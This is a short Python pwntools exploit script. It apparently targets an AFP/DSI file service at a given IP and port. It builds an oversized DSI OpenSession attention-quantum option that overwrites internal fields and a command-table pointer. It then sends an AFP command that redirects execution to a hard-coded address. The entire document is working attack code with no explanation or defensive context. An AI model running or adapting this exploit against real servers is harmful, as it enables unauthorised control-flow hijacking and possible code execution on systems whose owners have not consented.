from pwn import *
import sys

if len(sys.argv) != 3:
    sys.exit(0)

ip = sys.argv[1]
port = int(sys.argv[2])
conn = remote(ip, port)

dsi_payload = b"\x00\x00\x40\x00"  # client quantum
dsi_payload += b'\x00\x00\x00\x00'  # overwrites datasize
dsi_payload += p32(0xdeadbeef)  # overwrites quantum
dsi_payload += p32(0xfeedface)  # overwrites the ids
dsi_payload += p64(0x639a40)  # overwrite commands ptr

dsi_opensession = b"\x01"  # attention quantum option
dsi_opensession += p8(len(dsi_payload))  # length
dsi_opensession += dsi_payload

dsi_header = b"\x00"  # "request" flag
dsi_header += b"\x04"  # open session command
dsi_header += b"\x00\x01"  # request id
dsi_header += b"\x00\x00\x00\x00"  # data offset
dsi_header += p32(len(dsi_opensession), endian='big')
dsi_header += b"\x00\x00\x00\x00"  # reserved
dsi_header += dsi_opensession

conn.send(dsi_header)
resp = conn.recv(1024)
print("[+] Open Session complete")

afp_command = b"\x01"  # invoke the second entry in the table
afp_command += b"\x00"  # protocol defined padding
afp_command += b"\x00\x00\x00\x00\x00\x00"  # pad out the first entry
afp_command += p64(0x428abd)  # address to jump to

dsi_header = b"\x00"  # "request" flag
dsi_header += b"\x02"  # "AFP" command
dsi_header += b"\x00\x02"  # request id
dsi_header += b"\x00\x00\x00\x00"  # data offset
dsi_header += p32(len(afp_command), endian='big')
dsi_header += b'\x00\x00\x00\x00'  # reserved
dsi_header += afp_command

print("[+] Sending get server info request")
conn.send(dsi_header)
resp = conn.recv(1024)
print(resp)
print("[+] Fin.")
conn.close()
